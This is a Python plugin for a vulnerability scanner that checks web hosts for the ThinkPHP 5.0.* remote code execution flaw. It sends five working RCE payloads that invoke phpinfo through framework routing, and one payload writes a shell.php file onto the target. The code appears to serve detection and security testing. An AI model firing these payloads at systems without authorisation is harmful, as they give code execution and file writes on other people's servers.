#!/usr/bin/env python
# -*- coding:utf-8 -*-
# PoC from https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/thinkphp/thinkphp_v5_rce.txt

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'thinkphp5_rce'
        self.info = "Check the ThinkPHP 5.0.* RCE"
        self.keyword = ['all', 'thinkphp', 'tp', 'rce', 'web', 'danger']
        self.default_ports_list = WEB_PORTS_LIST
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        pocdata = [ r'/?s=index/\think\Request/input&filter=phpinfo&data=1',
                    r'/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E',
                    r'/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E',
                    r'/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
                    r'/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
                  ]
        url1 = "http://%s:%d"%(ip, int(port)) if add_web_path == "" else "http://%s:%d/%s"%(ip, int(port), add_web_path)
        url2 = "https://%s:%d"%(ip, int(port)) if add_web_path == "" else "https://%s:%d/%s"%(ip, int(port), add_web_path)
        for poc in pocdata:
            try:
                req = Requester(url1+poc)
                if 'PHP Version' in req.html and 'System' in req.html:
                    result = "exists ThinkPHP 5.0.* RCE, check url: %s"%(url1)
                    self._output(ip, port, result)
                    return
            except RequesterOpenError:
                try:
                    req = Requester(url2+poc)
                    if 'PHP Version' in req.html and 'System' in req.html:
                        result = "exists ThinkPHP 5.0.* RCE, check url: %s"%(url2)
                        self._output(ip, port, result)
                        return                   
                except:
                    pass
            except:
                pass

globals()['VulnChecker'] = VulnChecker